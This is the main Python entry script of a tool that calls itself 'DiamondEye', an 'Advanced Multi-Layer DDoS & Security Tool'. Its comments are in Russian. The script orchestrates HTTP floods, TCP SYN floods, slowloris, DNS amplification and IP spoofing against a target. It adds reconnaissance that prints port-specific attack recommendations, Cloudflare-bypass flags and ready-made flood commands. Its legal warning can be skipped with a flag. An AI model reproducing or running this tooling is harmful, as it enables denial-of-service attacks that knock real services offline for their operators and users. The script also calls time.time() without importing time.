#!/usr/bin/env python3
# main.py
import asyncio
import sys
import os
import socket
import json
import logging
from urllib.parse import urlparse
from datetime import datetime

# Попытка использовать uvloop для ускорения
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    print("\033[96m⚡ uvloop activated — speed boost enabled\033[0m")
except ImportError:
    print("\033[93mℹ️  uvloop not available — using default asyncio\033[0m")

# Попытка импорта matplotlib для графиков
try:
    import matplotlib.pyplot as plt
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False

from args import parse_args
from core.attack_manager import AttackManager
from plugins.plugin_manager import PluginManager
from recon.scanner import ReconScanner, quick_recon
from colorama import Fore, Style, init
import constants

# Инициализация colorama
init(autoreset=True)

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('diamondeye')


def load_useragents(filepath: str) -> list:
    """Загрузка User-Agent'ов из файла."""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Failed to load useragents: {e}")
        return []


def parse_methods(raw: str) -> list:
    """Парсинг HTTP методов."""
    ALL_METHODS = constants.HTTP_METHODS
    if not raw:
        return ['GET']
    if raw.upper() == 'ALL':
        return ALL_METHODS
    return [m.strip().upper() for m in raw.split(',') 
            if m.strip().upper() in ALL_METHODS]


def validate_target(args):
    """Валидация цели атаки."""
    if args.attack_type == 'http' and not args.url and not args.recon:
        logger.error("URL is required for HTTP attack")
        return False
    
    if args.attack_type in ['tcp', 'dns', 'slowloris']:
        if not args.target_ip and not args.url:
            logger.error(f"Target IP or URL is required for {args.attack_type} attack")
            return False
        
        # Если передан URL, пытаемся извлечь IP
        if args.url and not args.target_ip:
            try:
                parsed = urlparse(args.url)
                hostname = parsed.hostname
                if hostname:
                    # Пытаемся разрешить IP
                    args.target_ip = socket.gethostbyname(hostname)
                    logger.info(f"Resolved {hostname} to {args.target_ip}")
            except Exception as e:
                logger.error(f"Failed to resolve hostname: {e}")
                return False
    
    # Для HTTP атак проверяем URL
    if args.url and not args.recon:
        try:
            parsed = urlparse(args.url)
            if not parsed.scheme or not parsed.netloc:
                logger.error(f"Invalid URL: {args.url}")
                return False
        except Exception as e:
            logger.error(f"URL parse error: {e}")
            return False
    
    return True


def check_dependencies():
    """Проверка необходимых зависимостей."""
    missing_deps = []
    
    try:
        import aiohttp
    except ImportError:
        missing_deps.append("aiohttp")
    
    try:
        import httpx
    except ImportError:
        missing_deps.append("httpx")
    
    try:
        import psutil
    except ImportError:
        missing_deps.append("psutil")
    
    try:
        import dns.resolver
    except ImportError:
        missing_deps.append("dnspython")
    
    if missing_deps:
        print(f"{Fore.RED}❌ Missing dependencies: {', '.join(missing_deps)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Install with: pip install {' '.join(missing_deps)}{Style.RESET_ALL}")
        return False
    
    return True


def print_banner():
    """Вывод баннера."""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║                     DiamondEye v10.0                        ║
║         Advanced Multi-Layer DDoS & Security Tool           ║
║            Plugin System | Reconnaissance | Proxy           ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)


def print_legal_warning(args):
    """Вывод предупреждения о законности для опасных опций."""
    if args.spoof_ip:
        print(f"{Fore.RED}{'!'*70}{Style.RESET_ALL}")
        print(f"{Fore.RED}⚠️  WARNING: IP SPOOFING DETECTED{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}IP spoofing without explicit permission is ILLEGAL in most jurisdictions.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}This technique can only be used on systems you own or have written authorization to test.{Style.RESET_ALL}")
        print(f"{Fore.RED}{'!'*70}{Style.RESET_ALL}")
        
        if not args.confirm_illegal:
            response = input(f"{Fore.YELLOW}Type 'I UNDERSTAND' to continue: {Style.RESET_ALL}")
            if response.strip().upper() != 'I UNDERSTAND':
                print(f"{Fore.RED}Exiting.{Style.RESET_ALL}")
                sys.exit(1)


async def handle_plugins(args):
    """Обработка плагинов."""
    plugin_manager = PluginManager()
    
    if args.list_plugins:
        print(f"{Fore.CYAN}📦 Available plugins:{Style.RESET_ALL}")
        await plugin_manager.discover_plugins()
        
        for plugin_info in plugin_manager.list_plugins():
            print(f"\n{Fore.GREEN}{plugin_info.name} v{plugin_info.version}{Style.RESET_ALL}")
            print(f"  Author: {plugin_info.author}")
            print(f"  Description: {plugin_info.description}")
            print(f"  Attack types: {', '.join(plugin_info.attack_types)}")
        
        return True
    
    elif args.plugin:
        print(f"{Fore.CYAN}🚀 Executing plugin: {args.plugin}{Style.RESET_ALL}")
        await plugin_manager.discover_plugins()
        
        plugin = plugin_manager.get_plugin(args.plugin)
        if not plugin:
            logger.error(f"Plugin '{args.plugin}' not found")
            available = ', '.join(plugin_manager.plugins.keys())
            print(f"{Fore.YELLOW}💡 Available plugins: {available}{Style.RESET_ALL}")
            return False
        
        # Загрузка конфигурации плагина
        plugin_config = {}
        if args.plugin_config:
            try:
                with open(args.plugin_config, 'r', encoding='utf-8') as f:
                    plugin_config = json.load(f)
            except Exception as e:
                logger.error(f"Failed to load plugin config: {e}")
        
        # Базовая конфигурация
        base_config = {
            'target': args.url or args.target_ip,
            'workers': args.workers,
            'sockets': args.sockets,
            'debug': args.debug,
            'attack_type': args.attack_type,
            'duration': args.duration
        }
        
        plugin_config.update(base_config)
        
        try:
            await plugin.initialize(plugin_config)
            logger.info(f"Plugin initialized successfully")
            
            # Выполнение плагина
            start_time = time.time()
            result = await plugin.execute(plugin_config['target'], duration=args.duration)
            duration = time.time() - start_time
            
            print(f"\n{Fore.GREEN}✅ Plugin execution completed in {duration:.1f}s{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 Results:{Style.RESET_ALL}")
            
            # Вывод результатов
            for key, value in result.items():
                if isinstance(value, dict):
                    print(f"  {key}:")
                    for k, v in value.items():
                        print(f"    {k}: {v}")
                else:
                    print(f"  {key}: {value}")
            
            await plugin.cleanup()
            return True
            
        except Exception as e:
            logger.error(f"Plugin execution failed: {e}", exc_info=args.debug)
            return False
    
    return False


async def handle_recon(args):
    """Обработка разведки."""
    target = args.url or args.target_ip
    if not target:
        logger.error("Target required for reconnaissance")
        return False
    
    print(f"{Fore.CYAN}🎯 Starting reconnaissance on {target}{Style.RESET_ALL}")
    
    try:
        scanner = ReconScanner(target)
        
        # Парсинг портов для сканирования
        ports_to_scan = []
        if args.recon_ports:
            for part in args.recon_ports.split(','):
                part = part.strip()
                if '-' in part:
                    start, end = map(int, part.split('-'))
                    ports_to_scan.extend(range(start, end + 1))
                else:
                    ports_to_scan.append(int(part))
        else:
            ports_to_scan = constants.COMMON_PORTS
        
        # Сохраняем порты в атрибут для доступа в сканере
        scanner.ports_to_scan = ports_to_scan
        
        # Выполнение сканирования
        results = await scanner.full_scan()
        
        # Вывод отчёта
        print("\n" + scanner.generate_report())
        
        # Сохранение отчёта
        if args.recon_save:
            filename = args.recon_save
        else:
            safe_target = target.replace('://', '_').replace('/', '_').replace(':', '_')
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"recon_{safe_target}_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\n{Fore.GREEN}✅ Reconnaissance report saved to {filename}{Style.RESET_ALL}")
        
        # Генерация рекомендаций по атаке
        await generate_attack_recommendations(results)
        
        return True
        
    except Exception as e:
        logger.error(f"Reconnaissance failed: {e}", exc_info=args.debug)
        return False


async def generate_attack_recommendations(recon_data: dict):
    """Генерация рекомендаций по атаке на основе разведки."""
    print(f"\n{Fore.CYAN}🎯 Attack Recommendations:{Style.RESET_ALL}")
    
    recommendations = []
    open_ports = []
    
    if 'port_scan' in recon_data:
        open_ports = recon_data['port_scan'].get('open_ports', [])
        services = recon_data.get('services', {})
        
        for port in open_ports:
            service = services.get(port, '').lower()
            
            if port in (80, 443) or 'http' in service:
                proto = 'https' if port == 443 else 'http'
                recommendations.append(f"  • Port {port} (HTTP{'S' if port==443 else ''}): Use Layer7 attack with --attack-type http")
                recommendations.append(f"    Example: python main.py {proto}://target.com --workers 100 --flood")
            
            elif port == 53 or 'dns' in service:
                recommendations.append(f"  • Port {port} (DNS): DNS amplification attack with --attack-type dns --amplification")
                recommendations.append(f"    Example: python main.py --attack-type dns --target-ip TARGET_IP --workers 50")
            
            elif port == 22 or 'ssh' in service:
                recommendations.append(f"  • Port {port} (SSH): TCP SYN flood with --attack-type tcp --target-port {port}")
            
            elif port == 3306 or 'mysql' in service:
                recommendations.append(f"  • Port {port} (MySQL): Connection exhaustion with --attack-type tcp --target-port {port}")
    
    # Анализ SSL/TLS
    if 'ssl_info' in recon_data and recon_data['ssl_info'].get('supported'):
        recommendations.append("  • SSL/TLS detected: Consider using --http2 for better performance")
    
    # Анализ DNS
    if 'dns_records' in recon_data:
        dns_records = recon_data['dns_records']
        txt_records = ' '.join(dns_records.get('TXT', [])).lower()
        if 'cloudflare' in txt_records:
            recommendations.append("  • Cloudflare detected: Use bypass techniques with --junk --random-host")
    
    # Анализ уязвимостей
    if 'vulnerabilities' in recon_data and recon_data['vulnerabilities']:
        vulns = recon_data['vulnerabilities']
        recommendations.append(f"  • {len(vulns)} vulnerabilities found: Target specific weaknesses")
        for vuln in vulns:
            if 'TRACE' in vuln.get('type', ''):
                recommendations.append(f"    - HTTP TRACE enabled: Use --method-fuzz")
            elif 'PHPINFO' in vuln.get('type', ''):
                recommendations.append(f"    - phpinfo exposed: Target /phpinfo.php with high load")
    
    if recommendations:
        for rec in recommendations:
            print(rec)
    else:
        print(f"  {Fore.YELLOW}No specific recommendations. Use general attack methods.{Style.RESET_ALL}")
    
    if open_ports:
        print(f"\n{Fore.CYAN}💡 Sample attack command:{Style.RESET_ALL}")
        target = recon_data.get('parsed_url', {}).get('hostname', 'target.com')
        sample_cmd = f"python main.py http://{target} --workers 100 --flood"
        
        if len(open_ports) > 5:
            sample_cmd += " --adaptive"
        
        print(f"  {sample_cmd}")


async def main():
    """Главная функция."""
    # Парсинг аргументов
    args = parse_args()
    
    # Если только --help или без аргументов, показываем помощь
    if len(sys.argv) == 1:
        return
    
    # Проверка зависимостей
    if not check_dependencies():
        sys.exit(1)
    
    # Вывод баннера
    print_banner()
    
    # Предупреждение для опасных опций
    print_legal_warning(args)
    
    # Обработка плагинов
    if args.list_plugins or args.plugin:
        await handle_plugins(args)
        return
    
    # Обработка разведки
    if args.recon:
        await handle_recon(args)
        return
    
    # Валидация цели
    if not validate_target(args):
        sys.exit(1)
    
    # Проверка конфликтов параметров
    if args.http2 and args.extreme:
        logger.warning("--http2 incompatible with --extreme — disabling http2")
        args.http2 = False
    
    if args.http3 and args.extreme:
        logger.warning("--http3 incompatible with --extreme — disabling http3")
        args.http3 = False
    
    if args.flood and args.slow > 0:
        logger.warning("--flood disables --slow — modes conflict")
        args.slow = 0.0
    
    if args.header_flood and not args.junk:
        logger.warning("--header-flood requires --junk — enabling junk headers")
        args.junk = True
    
    # Проверка прав для raw sockets
    if args.attack_type in ['tcp', 'dns'] and args.spoof_ip:
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            test_sock.close()
        except PermissionError:
            logger.warning("IP spoofing requires root/admin privileges — running without spoofing")
            args.spoof_ip = False
    
    # Загрузка User-Agent'ов
    useragents = []
    if args.useragents:
        useragents = load_useragents(args.useragents)
    elif args.rotate_ua:
        # Загружаем дефолтные из констант или файла
        default_ua_file = os.path.join("res", "lists", "useragents", "useragents.txt")
        if os.path.exists(default_ua_file):
            useragents = load_useragents(default_ua_file)
    
    # Добавляем специальные User-Agent'ы для localhost
    if args.url:
        parsed = urlparse(args.url)
        netloc = parsed.netloc.lower()
        if netloc.startswith(('127.', 'localhost', '0.0.0.0')):
            useragents.append("CTF-Scanner/10.0")
            useragents.append("Mozilla/5.0 (X11; Linux x86_64) DiamondEye-Mode")
    
    args.useragents = useragents
    
    # Парсинг методов
    args.methods = parse_methods(args.methods)
    
    # Ограничение воркеров для localhost
    if args.url:
        parsed = urlparse(args.url)
        netloc = parsed.netloc.lower()
        if netloc.startswith(('127.', 'localhost', '0.0.0.0')):
            max_workers = max(1, os.cpu_count() * 4)
            if args.workers > max_workers:
                logger.info(f"Localhost: workers limited to {max_workers}")
                args.workers = max_workers
    
    # Создание и запуск менеджера атак
    print(f"{Fore.CYAN}⚙️  Configuration:{Style.RESET_ALL}")
    print(f"  Attack Type: {args.attack_type.upper()}")
    print(f"  Workers: {args.workers} ({args.sockets} sockets each)")
    
    if args.url:
        print(f"  Target: {args.url}")
    elif args.target_ip:
        print(f"  Target: {args.target_ip}:{args.target_port}")
    
    if args.duration > 0:
        print(f"  Duration: {args.duration}s")
    
    if args.proxy_auto or args.proxy_file:
        print(f"  Proxy: Auto-enabled")
    
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    attack_manager = AttackManager(args)
    
    # Инициализация
    if not await attack_manager.initialize():
        logger.error("Failed to initialize attack manager")
        sys.exit(1)
    
    # Запуск атаки
    start_time = time.time()
    
    try:
        await attack_manager.start_attack()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}🛑 Attack interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=args.debug)
    finally:
        # Остановка атаки
        await attack_manager.stop_attack()
        
        # Вывод итоговой статистики
        duration = time.time() - start_time
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ Attack completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⏱️  Total duration: {duration:.1f}s{Style.RESET_ALL}")
        
        # Вывод отчёта мониторинга ресурсов
        if attack_manager.resource_monitor:
            attack_manager.resource_monitor.print_final_report()
        
        # Сохранение графика
        if args.plot and MATPLOTLIB_AVAILABLE:
            save_plot(attack_manager, args.plot)
        
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")


def save_plot(attack_manager, filepath):
    """Сохранение графика RPS."""
    if not attack_manager.stats.get('rps_history'):
        return
    
    try:
        times = [p['time'] for p in attack_manager.stats['rps_history']]
        rps = [p['rps'] for p in attack_manager.stats['rps_history']]
        
        plt.figure(figsize=(12, 6))
        
        # График RPS
        plt.subplot(2, 1, 1)
        plt.plot(times, rps, color='red', linewidth=1.5)
        plt.xlabel('Time (s)')
        plt.ylabel('Requests/Sec')
        plt.title('DiamondEye v10.0 - RPS over Time')
        plt.grid(True, alpha=0.3)
        
        # График пропускной способности
        if attack_manager.resource_monitor and attack_manager.resource_monitor.network_history:
            net_times = []
            net_mbps = []
            for i, h in enumerate(attack_manager.resource_monitor.network_history):
                net_times.append(i)
                sent_mbps = (h['sent_bytes'] * 8) / 1024 / 1024
                net_mbps.append(sent_mbps)
            
            plt.subplot(2, 1, 2)
            plt.plot(net_times, net_mbps, color='blue', linewidth=1.5)
            plt.xlabel('Time (samples)')
            plt.ylabel('Bandwidth (Mbps)')
            plt.title('Network Bandwidth Usage')
            plt.grid(True, alpha=0.3)
        
        plt.tight_layout()
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        plt.savefig(filepath, dpi=150)
        plt.close()
        
        logger.info(f"Plot saved: {filepath}")
        
    except Exception as e:
        logger.error(f"Plot error: {e}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}🛑 DiamondEye stopped{Style.RESET_ALL}")
    except Exception as e:
        logger.critical(f"Critical error: {e}", exc_info=True)
        sys.exit(1)